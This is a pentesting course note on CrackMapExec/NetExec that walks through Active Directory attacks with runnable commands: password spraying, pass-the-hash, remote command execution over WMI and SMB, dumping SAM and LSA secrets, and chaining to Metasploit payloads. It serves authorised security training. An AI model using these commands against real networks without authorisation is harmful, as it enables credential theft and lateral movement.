---
tags: [tools, vapt, utility]
difficulty: intermediate
module: "41 - Tools"
topic: "41.14 CrackMapExec"
---

# 41.14 CrackMapExec (NetExec): Active Directory Exploitation and Automation

## Introduction

`CrackMapExec` (CME), recently forked and heavily maintained as `NetExec` (nxc), is a "swiss army knife" for pentesting Active Directory (AD) environments. It automates assessing the security of large Active Directory networks, consolidating many different techniques into a single, cohesive tool.

While tools like [[13 - Hydra]] are great for brute-forcing, CME is designed for post-compromise enumeration, lateral movement, password spraying, and interacting with core AD protocols (SMB, WMI, LDAP, WinRM, MSSQL, RDP). It uses the `Impacket` library heavily under the hood to achieve this without requiring native Windows tools.

### Why CrackMapExec / NetExec?
- **All-in-One**: Replaces the need for dozens of disparate scripts.
- **Credential Testing**: Can validate credentials or hashes against entire subnets in seconds.
- **Lateral Movement**: Can execute commands via WMI or SMB (psexec) automatically upon finding valid admin credentials.
- **OPSEC**: Operates entirely from memory where possible and avoids dropping binaries to disk, reducing EDR detection.

## Architecture and Execution Flow

```text
+-------------------+       +-----------------------+       +-------------------+
|                   |       |                       |       |   Target Network  |
| Attacker Machine  | ----> | CME / NetExec Engine  | ----> |   (10.0.0.0/24)   |
| (Credentials/Hash)|       | (Impacket Protocols)  |       |                   |
|                   |       |                       |       |                   |
+--------+----------+       +-----------+-----------+       +---------+---------+
         |                              |                             |
         |                              | (SMB, WMI, LDAP, WinRM)     |
         |                              v                             |
         |                  +-----------------------+                 |
         |                  | Protocol Handler      |                 |
         |                  | (e.g., SMB client)    |                 |
         |                  +-----------------------+                 |
         |                              |                             |
         |                              | 1. Authenticate             |
         |                              |---------------------------->|
         |                              |                             |
         |                              | 2. Execute Action / Enumerate|
         |<-----------------------------|<----------------------------|
           (Outputs Pwn3d! if Admin)
```

CME takes a set of credentials (plaintext or NTLM hash), a target list (IPs, CIDRs, or an imported file), and a protocol module. It authenticates to the targets concurrently. If the authentication is successful, it checks if the account has local administrator rights (marked by a `Pwn3d!` tag). It can then dynamically execute modules (e.g., dumping LSA secrets or enabling RDP) on those compromised hosts.

## Core Concepts

1. **Protocols**: CME supports multiple protocols. The primary ones are `smb`, `winrm`, `wmi`, `ldap`, `mssql`, `rdp`, and `ssh`.
2. **Modules**: Scripts that execute post-authentication. Examples include `lsassy` (for dumping memory), `bloodhound` (for AD mapping), and `slui` (for privilege escalation).
3. **Pass-the-Hash (PtH)**: CME inherently supports authenticating with NTLM hashes instead of passwords, which is critical in Windows environments where hashes are frequently dumped.
4. **Local vs. Domain Auth**: Specifying `--local-auth` tells CME to authenticate against the local SAM database rather than the Domain Controller.

## Installation and Setup

While CrackMapExec is the legacy name, the community has largely migrated to **NetExec** (nxc) due to better maintenance and python3 compatibility.

To install NetExec via pipx (recommended):
```bash
pipx install netexec
```
Or via apt on Kali:
```bash
sudo apt install netexec
```
To run the tool, use `nxc` (or `cme` if using the legacy version).

## Detailed Usage and Methodology

### 1. Basic Enumeration and Recon
Before authenticating, you can use null sessions to gather information about the network.
```bash
nxc smb 192.168.1.0/24
```
This will identify hostnames, OS versions, domain names, and SMB signing requirements across the subnet.

### 2. Password Spraying
Spraying a single password across all users in a domain to avoid account lockout.
```bash
nxc smb 192.168.1.10 -u users.txt -p 'Fall2024!'
```

### 3. Validating Credentials & Pass-the-Hash
Testing if a known password or hash is valid across a subnet, and specifically checking for Local Admin rights.
```bash
nxc smb 192.168.1.0/24 -u 'jsmith' -p 'SuperSecret123'
```
Using an NTLM hash (Pass-the-Hash):
```bash
nxc smb 192.168.1.0/24 -u 'Administrator' -H 'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0'
```
If the account has local admin rights on a machine, NetExec will append `(Pwn3d!)` in yellow.

### 4. Executing Commands (Lateral Movement)
If you have local admin (`Pwn3d!`), you can execute arbitrary OS commands.
Using WMI (stealthier than SMB/psexec):
```bash
nxc wmi 192.168.1.50 -u 'admin' -p 'password' -x 'whoami'
```
Using SMB (creates a service, highly visible):
```bash
nxc smb 192.168.1.50 -u 'admin' -p 'password' -x 'ipconfig'
```

### 5. Dumping Hashes and Secrets
Once you have administrative access, you can dump the local SAM database or LSA secrets to find more credentials.
```bash
nxc smb 192.168.1.50 -u 'admin' -p 'password' --sam
nxc smb 192.168.1.50 -u 'admin' -p 'password' --lsa
```

### 6. Using Modules
Modules extend NetExec's capabilities significantly.
To list modules for SMB:
```bash
nxc smb -L
```
To execute the `spider_plus` module (which maps out readable file shares):
```bash
nxc smb 192.168.1.0/24 -u 'user' -p 'pass' -M spider_plus
```
To execute BloodHound data collection via LDAP:
```bash
nxc ldap 192.168.1.10 -u 'user' -p 'pass' --bloodhound --collection All
```

## Security and Ethical Considerations
- CME is a post-compromise tool. Its actions (like executing commands via WMI or dumping SAM) are highly monitored by endpoint detection and response (EDR) solutions (like CrowdStrike or Defender for Endpoint).
- Spraying passwords must be done with strict adherence to the domain's password lockout policy to avoid disabling business-critical accounts.

## Chaining Opportunities
- Start with `enum4linux` or `rpcclient` to gather usernames.
- Feed the username list into `nxc` for a password spray attack.
- If a user is compromised, check if they have local admin (`Pwn3d!`).
- If admin is achieved, use `nxc` to dump the local SAM to obtain the local administrator hash.
- Use `nxc` to Pass-the-Hash across the rest of the subnet to achieve lateral movement.
- Connect back to [[12 - Metasploit Framework]] by executing a payload via `nxc -x`.

## Related Notes
- [[13 - Hydra]]
- [[12 - Metasploit Framework]]
